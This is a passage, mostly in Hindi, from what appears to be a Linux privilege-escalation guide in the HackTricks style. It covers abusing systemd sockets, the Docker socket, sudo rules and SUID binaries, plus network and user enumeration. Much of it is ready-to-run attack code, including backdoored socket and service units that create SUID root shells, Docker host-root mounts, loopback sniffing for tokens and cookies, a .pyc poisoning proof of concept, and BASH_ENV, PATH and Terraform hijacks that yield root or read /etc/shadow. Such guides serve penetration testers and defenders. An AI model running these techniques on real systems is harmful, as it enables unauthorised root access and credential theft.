Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note करें कि **timer** **activated** होता है इसे `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` पर symlink बनाकर

## Sockets

Unix Domain Sockets (UDS) **process communication** को same या different machines पर client-server models के अंदर enable करते हैं। ये standard Unix descriptor files का उपयोग करके inter-computer communication करते हैं और `.socket` files के जरिए set up होते हैं।

Sockets को `.socket` files का उपयोग करके configure किया जा सकता है।

**sockets के बारे में और जानने के लिए `man systemd.socket` देखें।** इस file के अंदर, कई interesting parameters configure किए जा सकते हैं:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: ये options अलग-अलग हैं, लेकिन एक summary का उपयोग यह **indicate करने** के लिए किया जाता है कि यह socket पर कहाँ listen करने वाला है (AF_UNIX socket file का path, IPv4/6 और/या listen करने के लिए port number, आदि)।
- `Accept`: एक boolean argument लेता है। यदि **true** हो, तो हर incoming connection के लिए एक **service instance** spawn होता है और केवल connection socket उसे pass किया जाता है। यदि **false** हो, तो सभी listening sockets खुद **started service unit** को pass किए जाते हैं, और सभी connections के लिए केवल एक service unit spawn होता है। यह value datagram sockets और FIFOs के लिए ignore की जाती है, जहाँ एक single service unit बिना शर्त सभी incoming traffic को handle करता है। **Defaults to false**. Performance reasons के लिए, नए daemons को केवल ऐसे तरीके से लिखना recommended है जो `Accept=no` के लिए suitable हो।
- `ExecStartPre`, `ExecStartPost`: एक या अधिक command lines लेते हैं, जिन्हें क्रमशः listening **sockets**/FIFOs के **created** और bound होने से पहले या बाद में **executed** किया जाता है। Command line का पहला token एक absolute filename होना चाहिए, उसके बाद process के लिए arguments हों।
- `ExecStopPre`, `ExecStopPost`: अतिरिक्त **commands** जो listening **sockets**/FIFOs के **closed** और removed होने से पहले या बाद में, क्रमशः **executed** की जाती हैं।
- `Service`: incoming traffic पर **activate** होने वाली **service** unit का नाम बताता है। यह setting केवल Accept=no वाले sockets के लिए allowed है। डिफ़ॉल्ट रूप से यह उस service पर set होता है जिसका नाम socket के same होता है (suffix बदला हुआ). अधिकांश मामलों में, इस option का उपयोग करना आवश्यक नहीं होना चाहिए।

### Writable .socket files

यदि आपको कोई **writable** `.socket` file मिलती है, तो आप `[Socket]` section के beginning में कुछ ऐसा **add** कर सकते हैं: `ExecStartPre=/home/kali/sys/backdoor` और backdoor socket create होने से पहले execute हो जाएगा। इसलिए, आपको **probably machine reboot होने तक wait करना पड़ेगा।**\
_ध्यान दें कि system को उस socket file configuration का उपयोग करना चाहिए, वरना backdoor execute नहीं होगा_

### Socket activation + writable unit path (create missing service)

एक और high-impact misconfiguration है:

- `Accept=no` और `Service=<name>.service` वाला socket unit
- referenced service unit missing हो
- attacker `/etc/systemd/system` (या किसी और unit search path) में write कर सकता हो

ऐसे में, attacker `<name>.service` create कर सकता है, फिर socket पर traffic trigger कर सकता है ताकि systemd new service को root के रूप में load और execute करे।

Quick flow:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Writable sockets

यदि आप **किसी भी writable socket** की **पहचान** करते हैं (_अब हम Unix Sockets की बात कर रहे हैं, न कि config `.socket` files की_), तो **आप उस socket के साथ communicate** कर सकते हैं और शायद किसी vulnerability का exploit कर सकते हैं।

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### कच्चा connection
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

ध्यान दें कि कुछ **sockets HTTP** अनुरोधों के लिए सुन रहे हो सकते हैं (_मैं .socket files की बात नहीं कर रहा हूँ, बल्कि उन files की जो unix sockets की तरह काम करती हैं_). आप इसे इस तरह check कर सकते हैं:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
यदि socket **HTTP** request के साथ **respond** करता है, तो आप इससे **communicate** कर सकते हैं और शायद किसी **vulnerability को exploit** कर सकते हैं।

### Writable Docker Socket

Docker socket, जो अक्सर `/var/run/docker.sock` पर मिलता है, एक critical file है जिसे secured होना चाहिए। By default, यह `root` user और `docker` group के members के लिए writable होता है। इस socket पर write access होना privilege escalation तक ले जा सकता है। यहाँ बताया गया है कि यह कैसे किया जा सकता है और अगर Docker CLI उपलब्ध न हो तो alternative methods क्या हैं।

#### **Docker CLI के साथ Privilege Escalation**

अगर आपके पास Docker socket पर write access है, तो आप निम्न commands का उपयोग करके privileges escalate कर सकते हैं:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
These commands allow you to run a container with root-level access to the host's file system.

#### **Using Docker API Directly**

In cases where the Docker CLI isn't available, the Docker socket can still be manipulated using the Docker API and `curl` commands.

1.  **List Docker Images:** उपलब्ध images की सूची प्राप्त करें।

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** host system की root directory mount करने वाला container बनाने के लिए request भेजें।

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

नया बनाए गए container को start करें:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** container से connection establish करने के लिए `socat` का उपयोग करें, जिससे उसमें command execution संभव हो सके।

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` connection set up करने के बाद, आप container के अंदर सीधे host के filesystem तक root-level access के साथ commands execute कर सकते हैं।

### Others

ध्यान दें कि यदि आपके पास docker socket पर write permissions हैं क्योंकि आप **group `docker`** के अंदर हैं, तो आपके पास [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group) हैं। यदि [**docker API एक port पर listening है** तो आप इसे compromise भी कर सकते हैं](../../network-services-pentesting/2375-pentesting-docker.md#compromising)।

जांचें **containers से break out करने या container runtimes का abuse करके privileges escalate करने के और तरीके**:

{{#ref}}
container-security/
{{endref}}

## Containerd (ctr) privilege escalation

यदि आप **`ctr`** command का उपयोग कर सकते हैं, तो निम्न page पढ़ें क्योंकि **आप इसका abuse करके privileges escalate** कर सकते हैं:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{endref}}

## **RunC** privilege escalation

यदि आप **`runc`** command का उपयोग कर सकते हैं, तो निम्न page पढ़ें क्योंकि **आप इसका abuse करके privileges escalate** कर सकते हैं:


{{#ref}}
runc-privilege-escalation.md
{{endref}}

## **D-Bus**

D-Bus एक sophisticated **inter-Process Communication (IPC) system** है जो applications को efficiently interact करने और data share करने में सक्षम बनाता है। Modern Linux system को ध्यान में रखकर design किया गया, यह विभिन्न प्रकार की application communication के लिए एक robust framework प्रदान करता है।

यह system versatile है, और basic IPC को support करता है जो processes के बीच data exchange को बेहतर बनाता है, जो **enhanced UNIX domain sockets** जैसा है। इसके अलावा, यह events या signals को broadcast करने में मदद करता है, जिससे system components के बीच seamless integration संभव होती है। उदाहरण के लिए, Bluetooth daemon से incoming call के बारे में signal music player को mute करने के लिए prompt कर सकता है, जिससे user experience बेहतर होता है। साथ ही, D-Bus एक remote object system को support करता है, जिससे applications के बीच service requests और method invocations सरल हो जाते हैं, और traditionally complex रहे processes streamlined हो जाते हैं।

D-Bus एक **allow/deny model** पर काम करता है, message permissions (method calls, signal emissions, आदि) को matching policy rules के cumulative effect के आधार पर manage करता है। ये policies bus के साथ interactions specify करती हैं, और इन permissions के exploitation के माध्यम से privilege escalation संभव हो सकती है।

`/etc/dbus-1/system.d/wpa_supplicant.conf` में ऐसी policy का एक उदाहरण दिया गया है, जिसमें root user को `fi.w1.wpa_supplicant1` को own करने, उसे send करने, और उससे messages receive करने की permissions का विवरण है।

जिस policy में specified user या group नहीं होता, वह universally apply होती है, जबकि "default" context policies उन सभी पर apply होती हैं जो अन्य specific policies द्वारा covered नहीं हैं।
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**यहाँ D-Bus communication को enumerate और exploit करना सीखें:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Network**

हर बार network को enumerate करना और machine की position का पता लगाना दिलचस्प होता है।

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### आउटबाउंड फ़िल्टरिंग क्विक ट्राइएज

यदि होस्ट commands चला सकता है लेकिन callbacks fail हो रहे हैं, तो DNS, transport, proxy, और route filtering को जल्दी से अलग करें:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### खुले ports

मशीन पर चल रही network services को हमेशा check करें, जिनके साथ आप access करने से पहले interact नहीं कर पाए थे:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
बाइंड target के अनुसार listeners को classify करें:

- `0.0.0.0` / `[::]`: सभी local interfaces पर exposed.
- `127.0.0.1` / `::1`: local-only (good tunnel/forward candidates).
- Specific internal IPs (e.g. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): usually केवल internal segments से reachable।

### Local-only service triage workflow

जब आप किसी host को compromise करते हैं, तो `127.0.0.1` पर bound services अक्सर पहली बार आपकी shell से reachable हो जाती हैं। एक quick local workflow है:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### नेटवर्क स्कैनर के रूप में LinPEAS (network-only mode)

local PE checks के अलावा, linPEAS एक focused network scanner के रूप में चल सकता है। यह `$PATH` में उपलब्ध binaries का उपयोग करता है (आमतौर पर `fping`, `ping`, `nc`, `ncat`) और कोई tooling install नहीं करता।
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
यदि आप `-t` के बिना `-d`, `-p`, या `-i` पास करते हैं, तो linPEAS एक शुद्ध नेटवर्क स्कैनर की तरह व्यवहार करता है (privilege-escalation checks के बाकी हिस्से को छोड़ते हुए)।

### Sniffing

जांचें कि क्या आप traffic sniff कर सकते हैं। अगर कर सकते हैं, तो आप कुछ credentials grab कर सकते हैं।
```
timeout 1 tcpdump
```
त्वरित व्यावहारिक checks:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) post-exploitation में खास तौर पर मूल्यवान है क्योंकि कई internal-only services वहाँ tokens/cookies/credentials expose करती हैं:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
अब पकड़ो, बाद में parse करो:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Users

### Generic Enumeration

जांचें कि **आप** कौन हैं, आपके पास कौन-सी **privileges** हैं, सिस्टम में कौन-से **users** हैं, कौन-से **login** कर सकते हैं और किनके पास **root privileges** हैं:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

कुछ Linux versions एक bug से प्रभावित थे जो **UID > INT_MAX** वाले users को privileges escalate करने देता है। अधिक जानकारी: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) और [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Groups

देखें कि क्या आप किसी ऐसे group के **member** हैं जो आपको root privileges दे सकता है:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

देखें कि क्या clipboard के अंदर कोई interesting चीज़ मौजूद है (यदि संभव हो)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### पासवर्ड नीति
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Known passwords

अगर आपको environment का कोई भी password **पता है**, तो उस password का इस्तेमाल करके **हर user के रूप में login करने की कोशिश करें**।

### Su Brute

अगर आपको बहुत noise करने से दिक्कत नहीं है और computer पर `su` और `timeout` binaries मौजूद हैं, तो आप [su-bruteforce](https://github.com/carlospolop/su-bruteforce) का उपयोग करके user को brute-force करने की कोशिश कर सकते हैं।\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) भी `-a` parameter के साथ users को brute-force करने की कोशिश करता है।

## Writable PATH abuses

### $PATH

अगर आपको कोई ऐसा folder मिलता है जिसमें आप $PATH के अंदर **write** कर सकते हैं, तो आप शायद **writable folder के अंदर एक backdoor बनाकर** privileges बढ़ा सकते हैं, ऐसे command के नाम से जो किसी दूसरे user (आदर्श रूप से root) द्वारा execute होने वाली है और जो $PATH में आपके writable folder से **पहले मौजूद किसी folder से load नहीं** हो रही है।

### SUDO and SUID

आपको sudo का उपयोग करके कुछ command execute करने की अनुमति हो सकती है, या उनमें suid bit हो सकती है। इसे इस तरह check करें:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
कुछ **unexpected commands आपको files को पढ़ने और/या लिखने, या यहाँ तक कि एक command execute करने** की अनुमति देते हैं। उदाहरण के लिए:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo configuration किसी user को password जाने बिना दूसरे user के privileges के साथ कुछ command execute करने की अनुमति दे सकती है.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
इस उदाहरण में उपयोगकर्ता `demo` `vim` को `root` के रूप में चला सकता है, अब root डायरेक्टरी में एक ssh key जोड़कर या `sh` को कॉल करके shell प्राप्त करना बहुत आसान है।
```
sudo vim -c '!sh'
```
### SETENV

यह directive उपयोगकर्ता को कुछ execute करते समय **एक environment variable set** करने की अनुमति देता है:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
यह उदाहरण, **HTB machine Admirer** पर आधारित, **PYTHONPATH hijacking** के प्रति **vulnerable** था, जिससे script को root के रूप में execute करते समय एक arbitrary python library load की जा सकती थी:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Writable `__pycache__` / `.pyc` poisoning in sudo-allowed Python imports

अगर एक **sudo-allowed Python script** किसी ऐसे module को import करता है जिसकी package directory में **writable `__pycache__`** हो, तो आप cached `.pyc` को replace करके अगली import पर privileged user के रूप में code execution पा सकते हैं।

- क्यों यह काम करता है:
- CPython bytecode caches को `__pycache__/module.cpython-<ver>.pyc` में store करता है।
- Interpreter **header** को validate करता है (magic + source से tied timestamp/hash metadata), फिर उस header के बाद stored marshaled code object को execute करता है।
- अगर directory writable है, तो आप cached file को **delete and recreate** कर सकते हैं; इससे root-owned लेकिन non-writable `.pyc` भी replace हो सकती है।
- Typical path:
- `sudo -l` दिखाता है कि आप root के रूप में कोई Python script या wrapper चला सकते हैं।
- वह script `/opt/app/`, `/usr/local/lib/...`, आदि से local module import करती है।
- imported module की `__pycache__` directory आपकी user या everyone के लिए writable होती है।

Quick enumeration:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
यदि आप privileged script का निरीक्षण कर सकते हैं, तो imported modules और उनका cache path पहचानें:
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
Abuse workflow:

1. एक बार sudo-allowed script चलाएं ताकि Python वैध cache file बना दे, अगर वह पहले से मौजूद नहीं है।
2. वैध `.pyc` से पहले 16 bytes पढ़ें और उन्हें poisoned file में reuse करें।
3. एक payload code object compile करें, `marshal.dumps(...)` करें, original cache file delete करें, और उसे original header plus आपके malicious bytecode के साथ फिर से बनाएं।
4. sudo-allowed script को फिर से चलाएं ताकि import आपके payload को root के रूप में execute करे।

Important notes:

- Original header को reuse करना key है क्योंकि Python cache metadata को source file से check करता है, यह नहीं कि bytecode body सच में source से match करती है या नहीं।
- यह खास तौर पर तब उपयोगी है जब source file root-owned हो और writable न हो, लेकिन containing `__pycache__` directory writable हो।
- Attack fail होता है अगर privileged process `PYTHONDONTWRITEBYTECODE=1` use करता है, safe permissions वाली location से import करता है, या import path में हर directory से write access हटा दिया जाता है।

Minimal proof-of-concept shape:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Hardening:

- सुनिश्चित करें कि privileged Python import path में कोई भी directory low-privileged users द्वारा writable न हो, जिसमें `__pycache__` भी शामिल है।
- Privileged runs के लिए, `PYTHONDONTWRITEBYTECODE=1` और unexpected writable `__pycache__` directories के लिए periodic checks पर विचार करें।
- Writable local Python modules और writable cache directories को उसी तरह treat करें जैसे आप writable shell scripts या shared libraries को करते हैं जिन्हें root execute करता है।

### BASH_ENV preserved via sudo env_keep → root shell

यदि sudoers `BASH_ENV` को preserve करता है (जैसे, `Defaults env_keep+="ENV BASH_ENV"`), तो आप Bash के non-interactive startup behavior का उपयोग करके allowed command invoke करते समय root के रूप में arbitrary code चला सकते हैं।

- Why it works: Non-interactive shells के लिए, Bash `$BASH_ENV` को evaluate करता है और target script चलाने से पहले उस file को source करता है। कई sudo rules किसी script या shell wrapper को चलाने की अनुमति देते हैं। यदि `BASH_ENV` sudo द्वारा preserved है, तो आपकी file root privileges के साथ source होती है।

- Requirements:
- एक sudo rule जिसे आप चला सकते हैं (कोई भी target जो `/bin/bash` को non-interactive रूप से invoke करता हो, या कोई bash script)।
- `BASH_ENV` का `env_keep` में present होना (`sudo -l` से check करें)।

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- `env_keep` से `BASH_ENV` (और `ENV`) हटाएँ, `env_reset` को प्राथमिकता दें।
- sudo-allowed commands के लिए shell wrappers से बचें; minimal binaries का उपयोग करें।
- preserved env vars के उपयोग पर sudo I/O logging और alerting पर विचार करें।

### Terraform via sudo with preserved HOME (!env_reset)

अगर sudo environment को intact छोड़ता है (`!env_reset`) और `terraform apply` की अनुमति देता है, तो `$HOME` calling user का ही रहता है। इसलिए Terraform root के रूप में **$HOME/.terraformrc** लोड करता है और `provider_installation.dev_overrides` को honor करता है।

- आवश्यक provider को एक writable directory की ओर point करें और provider के नाम से एक malicious plugin drop करें (जैसे, `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform Go plugin handshake में fail करेगा, लेकिन मरने से पहले payload को root के रूप में execute करेगा, जिससे पीछे एक SUID shell रह जाएगा।

### TF_VAR overrides + symlink validation bypass

Terraform variables `TF_VAR_<name>` environment variables के जरिए दिए जा सकते हैं, जो तब भी बने रहते हैं जब sudo environment को preserve करता है। `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` जैसी weak validations symlinks के साथ bypass की जा सकती हैं:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform symlink को resolve करता है और असली `/root/root.txt` को attacker-readable destination में copy करता है। वही तरीका destination symlinks को पहले से बनाकर privileged paths में **write** करने के लिए भी इस्तेमाल किया जा सकता है (जैसे provider’s destination path को `/etc/cron.d/` के अंदर point करना)।

### requiretty / !requiretty

कुछ पुराने distributions पर, sudo को `requiretty` के साथ configure किया जा सकता है, जो sudo को केवल interactive TTY से run होने के लिए force करता है। अगर `!requiretty` set है (या option absent है), तो sudo को non-interactive contexts जैसे reverse shells, cron jobs, या scripts से execute किया जा सकता है।
```bash
Defaults !requiretty
```
यह अपने आप में एक direct vulnerability नहीं है, लेकिन यह उन situations को बढ़ाता है जहाँ sudo rules का abuse full PTY के बिना भी किया जा सकता है।

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

अगर `sudo -l` में `env_keep+=PATH` या ऐसा `secure_path` दिखे जिसमें attacker-writable entries हों (जैसे `/home/<user>/bin`), तो sudo-allowed target के अंदर मौजूद कोई भी relative command shadow की जा सकती है।

- Requirements: एक sudo rule (अक्सर `NOPASSWD`) जो ऐसा script/binary चलाए जो absolute paths के बिना commands call करता हो (`free`, `df`, `ps`, etc.) और एक writable PATH entry जो सबसे पहले search होती हो।
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo execution bypassing paths
**Jump** to read other files or use **symlinks**. For example in sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
यदि एक **wildcard** का उपयोग किया जाता है (\*), तो यह और भी आसान हो जाता है:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**प्रतिरोधक उपाय**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### कमांड path के बिना Sudo command/SUID binary

यदि **sudo permission** एक single command को **बिना path specify किए** दी गई है: _hacker10 ALL= (root) less_ तो आप PATH variable बदलकर इसका exploit कर सकते हैं
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
यह तकनीक तब भी इस्तेमाल की जा सकती है अगर कोई **suid** binary **किसी दूसरे command को उसका path बताए बिना execute करती है (हमेशा** _**strings**_ **से किसी अजीब SUID binary की content जांचें)**।

[Execute करने के लिए payload examples.](payloads-to-execute.md)

### command path के साथ SUID binary

अगर **suid** binary **path specify करके किसी दूसरे command को execute करती है**, तो आप command के नाम से एक **function export** करने की कोशिश कर सकते हैं, जिसे suid file call कर रही है।

उदाहरण के लिए, अगर कोई suid binary _**/usr/sbin/service apache2 start**_ call करती है, तो आपको function बनाकर उसे export करने की कोशिश करनी होगी:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Then, when you call the suid binary, this function will be executed

### SUID wrapper द्वारा निष्पादित writable script

A common custom-app misconfiguration is a root-owned SUID binary wrapper that executes a script, while the script itself is writable by low-priv users.

Typical pattern:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
यदि `/usr/local/bin/backup.sh` writable है, तो आप payload commands append कर सकते हैं और फिर SUID wrapper execute करें:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
त्वरित जांच:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
यह attack path विशेष रूप से `/usr/local/bin` में ship किए गए "maintenance"/"backup" wrappers में common है।

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** environment variable का उपयोग एक या अधिक shared libraries (.so files) specify करने के लिए किया जाता है, जिन्हें loader द्वारा बाकी सभी से पहले load किया जाता है, including standard C library (`libc.so`)। इस process को library preloading कहा जाता है।

हालांकि, system security बनाए रखने और इस feature के misuse से बचाने के लिए, खासकर **suid/sgid** executables के साथ, system कुछ conditions enforce करता है:

- loader उन executables के लिए **LD_PRELOAD** को ignore करता है जहाँ real user ID (_ruid_) effective user ID (_euid_) से match नहीं करती।
- suid/sgid वाले executables के लिए, केवल standard paths में मौजूद और suid/sgid libraries ही preloaded होती हैं।

